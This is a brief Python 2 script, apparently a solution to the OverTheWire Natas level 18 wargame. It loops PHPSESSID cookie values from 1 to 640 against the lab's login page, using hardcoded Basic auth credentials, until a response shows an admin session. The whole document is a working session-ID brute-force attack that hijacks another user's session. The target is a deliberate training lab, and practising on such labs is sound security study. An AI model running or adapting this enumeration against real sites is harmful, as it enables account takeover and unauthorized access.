import requests
import base64

auth = 'Basic ' + base64.b64encode('natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
for i in range(1,641):
	Data = {"username":"admin","password":"aaa"}
	cookie = "PHPSESSID=" + str(i)
	r = requests.post("http://natas18.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth, "Cookie":cookie}, data = Data)
	if "You are an admin" in r.text:
		print r.text
		break
	else: 
		print str(i) + "-Fail"
